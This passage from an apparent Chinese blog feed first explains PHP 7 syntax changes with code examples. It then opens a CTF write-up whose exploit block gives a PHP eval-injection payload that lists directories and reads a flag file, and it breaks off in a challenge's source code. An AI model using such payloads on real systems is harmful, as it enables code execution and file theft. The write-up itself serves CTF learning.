关键字的时候，不再需要括号， 并且它变更为右联接操作符，其运算符优先级介于 <em>print</em> 和 <em>&#x3D;&gt;</em> 之间。 这可能导致现有代码的行为发生改变：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> -<span class="hljs-number">1</span>;<br><span class="hljs-comment">// 在之前版本中会被解释为：</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-keyword">yield</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 现在，它将被解释为：</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> (-<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-comment">// 在之前版本中会被解释为：</span><br><span class="hljs-keyword">yield</span> (<span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>);<br><span class="hljs-comment">// 现在，它将被解释为：</span><br>(<span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以通过使用括号来消除歧义。</p><h2 id="关于对引用数组元素创建的变量的顺序变化"><a href="#关于对引用数组元素创建的变量的顺序变化" class="headerlink" title="关于对引用数组元素创建的变量的顺序变化"></a>关于对引用数组元素创建的变量的顺序变化</h2><p>有如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="NULL合并运算符"><a href="#NULL合并运算符" class="headerlink" title="NULL合并运算符"></a>NULL合并运算符</h2><p>由于日常使用中存在大量同时使用三元表达式和 <code>isset()</code>的情况， 我们添加了null合并运算符 (<em>??</em>) 这个语法糖。如果变量存在且值不为<strong>NULL</strong>， 它就会返回自身的值，否则返回它的第二个操作数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sss</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$sss</span>= <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$bbb</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">#结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="太空船操作符（组合比较符）"><a href="#太空船操作符（组合比较符）" class="headerlink" title="太空船操作符（组合比较符）"></a>太空船操作符（组合比较符）</h2><p>太空船操作符用于比较两个表达式。当$a小于、等于或大于$b时它分别返回-1、0或1。 比较的原则是沿用 PHP 的<a href="https://www.php.net/manual/zh/types.comparisons.php"><strong>常规比较规则</strong></a>进行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 整数</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// 浮点数</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">2.5</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 1</span><br> <br><span class="hljs-comment">// 字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;b&quot;</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h2><p>现在支持通过<em>new class</em> 来实例化一个匿名类，这可以用来替代一些“用后即焚”的完整类定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span></span>)</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLogger</span>(<span class="hljs-params"></span>): <span class="hljs-title">Logger</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;logger;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setLogger</span>(<span class="hljs-params">Logger <span class="hljs-variable">$logger</span></span>) </span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>;<br><span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">setLogger</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> Logger &#123;<br>    <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br>    &#125;<br>&#125;);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">getLogger</span>());<br><br><span class="hljs-comment">#结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">object(class<span class="hljs-doctag">@anonymous</span>)#2 (0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Unicode-codepoint-转译语法"><a href="#Unicode-codepoint-转译语法" class="headerlink" title="Unicode codepoint 转译语法"></a>Unicode codepoint 转译语法</h2><p>这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;0000aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;9999&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="导入use声名组"><a href="#导入use声名组" class="headerlink" title="导入use声名组"></a>导入use声名组</h2><p>从同一 <code>namespace</code> 导入的类、函数和常量现在可以通过单个 <a href="https://www.php.net/manual/zh/language.namespaces.importing.php"><em>use</em></a> 语句 一次性导入了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// PHP 7 之前的代码</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_a</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_b</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_c</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstC</span>;<br><br><span class="hljs-comment">// PHP 7+ 及更高版本的代码</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ClassA</span>, <span class="hljs-title">ClassB</span>, <span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">fn_a</span>, <span class="hljs-title">fn_b</span>, <span class="hljs-title">fn_c</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ConstA</span>, <span class="hljs-title">ConstB</span>, <span class="hljs-title">ConstC</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="放宽了保留词限制"><a href="#放宽了保留词限制" class="headerlink" title="放宽了保留词限制"></a>放宽了保留词限制</h2><p>现在允许全局保留词用于类&#x2F;接口&#x2F;Trait 中的属性、常量和方法名。 在引入新关键词时，此变更减少了对向后兼容的破坏，避免了 API 命名的限制。</p><p>使用流畅的接口实现内部 DSL 时，这非常有用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 以前不能用  &#x27;new&#x27;、&#x27;private&#x27; 和 &#x27;for&#x27;</span><br><span class="hljs-title class_">Project</span>::<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;Project Name&#x27;</span>)-&gt;<span class="hljs-keyword">private</span>()-&gt;<span class="hljs-keyword">for</span>(<span class="hljs-string">&#x27;purpose here&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-string">&#x27;username here&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>唯一的限制是： <em>class</em>关键词不能用于常量名，否则会和 类名解析语法冲突 (<em>ClassName::class</em>)。</p><h2 id="（弃用）PHP4-风格的构造函数"><a href="#（弃用）PHP4-风格的构造函数" class="headerlink" title="（弃用）PHP4 风格的构造函数"></a>（弃用）PHP4 风格的构造函数</h2><p>PHP4 风格的构造函数（方法名和类名一样）将被弃用，并在将来移除。 如果在类中仅使用了 PHP4 风格的构造函数，PHP7 会产生 <strong>E_DEPRECATED</strong> 警告。 如果还定义了 <strong>__construct()</strong> 方法则不受影响。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am the constructor&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="（弃用）静态调用非静态的方法"><a href="#（弃用）静态调用非静态的方法" class="headerlink" title="（弃用）静态调用非静态的方法"></a>（弃用）静态调用非静态的方法</h2><p>废弃了<strong>静态</strong>调用未声明成 <strong>static</strong> 的方法，未来可能会彻底移除该功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am not static!&#x27;</span>;<br>    &#125;<br>&#125;<br><br>foo::<span class="hljs-title function_ invoke__">bar</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="错误和异常处理相关的变更-¶"><a href="#错误和异常处理相关的变更-¶" class="headerlink" title="错误和异常处理相关的变更 ¶"></a>错误和异常处理相关的变更<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.error-handling"> ¶</a></h2><h2 id="HTTP-RAW-POST-DATA-被移除-¶"><a href="#HTTP-RAW-POST-DATA-被移除-¶" class="headerlink" title="$HTTP_RAW_POST_DATA 被移除 ¶"></a>$HTTP_RAW_POST_DATA 被移除<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.http-raw-post-data"> ¶</a></h2><h2 id="从不匹配的上下文发起调用-¶"><a href="#从不匹配的上下文发起调用-¶" class="headerlink" title="从不匹配的上下文发起调用 ¶"></a>从不匹配的上下文发起调用<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.incompatible-this"> ¶</a></h2><h2 id="函数定义不可以包含多个同名参数-¶"><a href="#函数定义不可以包含多个同名参数-¶" class="headerlink" title="函数定义不可以包含多个同名参数 ¶"></a>函数定义不可以包含多个同名参数<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameters"> ¶</a></h2><h2 id="在函数中检视参数值会返回-当前-的值-¶"><a href="#在函数中检视参数值会返回-当前-的值-¶" class="headerlink" title="在函数中检视参数值会返回 当前 的值 ¶"></a>在函数中检视参数值会返回 <em>当前</em> 的值<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameter-modified"> ¶</a></h2><h2 id="INI-文件中-注释格式被移除-¶"><a href="#INI-文件中-注释格式被移除-¶" class="headerlink" title="INI 文件中 # 注释格式被移除 ¶"></a>INI 文件中 <em>#</em> 注释格式被移除<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.ini-comments"> ¶</a></h2><h2 id="Switch-语句不可以包含多个-default-块-¶"><a href="#Switch-语句不可以包含多个-default-块-¶" class="headerlink" title="Switch 语句不可以包含多个 default 块 ¶"></a>Switch 语句不可以包含多个 default 块<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.multiple-default"> ¶</a></h2><h2 id="JSON-扩展已经被-JSOND-取代-¶"><a href="#JSON-扩展已经被-JSOND-取代-¶" class="headerlink" title="JSON 扩展已经被 JSOND 取代 ¶"></a>JSON 扩展已经被 JSOND 取代<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.json-to-jsond"> ¶</a></h2><h2 id="在数值溢出的时候，内部函数将会失败-¶"><a href="#在数值溢出的时候，内部函数将会失败-¶" class="headerlink" title="在数值溢出的时候，内部函数将会失败 ¶"></a>在数值溢出的时候，内部函数将会失败<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.internal-function-failure-overflow"> ¶</a></h2><h2 id="自定义会话处理器的返回值修复-¶"><a href="#自定义会话处理器的返回值修复-¶" class="headerlink" title="自定义会话处理器的返回值修复 ¶"></a>自定义会话处理器的返回值修复<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.fixes-custom-session-handler"> ¶</a></h2><h2 id="相等的元素在排序时的顺序问题-¶"><a href="#相等的元素在排序时的顺序问题-¶" class="headerlink" title="相等的元素在排序时的顺序问题 ¶"></a>相等的元素在排序时的顺序问题<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.sort-order"> ¶</a></h2><h2 id="错误的使用-break-和-switch-语句-¶"><a href="#错误的使用-break-和-switch-语句-¶" class="headerlink" title="错误的使用 break 和 switch 语句 ¶"></a>错误的使用 break 和 switch 语句<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.break-continue"> ¶</a></h2><h2 id="Mhash-不再是一个单独的扩展了-¶"><a href="#Mhash-不再是一个单独的扩展了-¶" class="headerlink" title="Mhash 不再是一个单独的扩展了 ¶"></a>Mhash 不再是一个单独的扩展了<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.mhash"> ¶</a></h2><h2 id="标量类型声明-¶"><a href="#标量类型声明-¶" class="headerlink" title="标量类型声明 ¶"></a>标量类型声明<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.scalar-type-declarations"> ¶</a></h2><h2 id="返回值类型声明-¶"><a href="#返回值类型声明-¶" class="headerlink" title="返回值类型声明 ¶"></a>返回值类型声明<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations"> ¶</a></h2><h2 id="生成器可以返回表达式-¶"><a href="#生成器可以返回表达式-¶" class="headerlink" title="生成器可以返回表达式 ¶"></a>生成器可以返回表达式<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.generator-return-expressions"> ¶</a></h2><h2 id="允许在克隆表达式上访问对象成员-¶"><a href="#允许在克隆表达式上访问对象成员-¶" class="headerlink" title="允许在克隆表达式上访问对象成员[ ¶]("></a>允许在克隆表达式上访问对象成员[ ¶](</h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>循环嵌套函数GetShell</title>
    <link href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/"/>
    <url>/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/</url>
    
    <content type="html"><![CDATA[<h1 id="函数妙用"><a href="#函数妙用" class="headerlink" title="函数妙用"></a>函数妙用</h1><h2 id="code-breaking-easy-phplimit函数的巧妙搭配"><a href="#code-breaking-easy-phplimit函数的巧妙搭配" class="headerlink" title="code-breaking_easy-phplimit函数的巧妙搭配"></a>code-breaking_easy-phplimit函数的巧妙搭配</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars</a></li><li><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></li><li><a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;../&#x27;</span>));<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;../flag_phpbyp4ss&#x27;</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br></code></pre></td></tr></table></figure><h2 id="ByteCTF-boring-code"><a href="#ByteCTF-boring-code" class="headerlink" title="ByteCTF boring_code"></a>ByteCTF boring_code</h2><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><p><a href="http://www.guildhab.top/?p=1077">http://www.guildhab.top/?p=1077</a></p></li><li><p><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></p></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\//i&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span 